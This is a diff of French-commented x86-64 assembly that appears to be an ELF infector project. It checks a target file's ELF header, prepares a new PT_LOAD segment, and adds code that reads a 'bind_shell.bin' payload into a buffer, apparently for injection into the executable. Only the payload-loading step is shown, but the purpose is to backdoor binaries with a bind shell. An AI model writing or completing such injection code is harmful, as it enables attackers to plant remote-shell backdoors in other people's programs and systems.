@@ -1,7 +1,8 @@
 section .data
 	vmagicnum db 0x7f, 0x45, 0x4c, 0x46
 	nomelf db "simple", 0
-
+	;payload_size  pour l'instant 34
+	payload_name db "bind_shell.bin", 0
 section .bss
 	elfheader resb 64
 
@@ -38,6 +39,7 @@ section .bss
 	new_p_align resq 1
 
 	payload_size resq 1
+	payload_buffer resb 4096
 	program_header_buff resb 56
 
 section .text
@@ -175,6 +177,32 @@ fin_recherche:
 	syscall				; Aller à la fin du fichier
 
 	mov r12, rax			; R12 = offset de fin du fichier
+
+	mov rax, 2
+	mov rdi, payload_name
+	mov rsi, 0
+	mov rdx, 0
+	syscall		; Ouvre le payload
+
+	mov r14, rax
+
+	cmp r14, 0
+	jl erreur
+
+	mov rax, 0
+	mov rdi, r14
+	mov rsi, payload_buffer
+	mov rdx, 4096
+	syscall 	;Lit le payload pour compter le nombre d'octet
+
+	cmp rax, 0
+	jle erreur
+
+	mov [payload_size], rax
+
+	mov rax, 3
+	mov rdi, r14
+	syscall 		;ferme l'ouverture du payload
 
 preparation_PT_LOAD:
 	mov dword [new_p_type], 1	; PT_LOAD
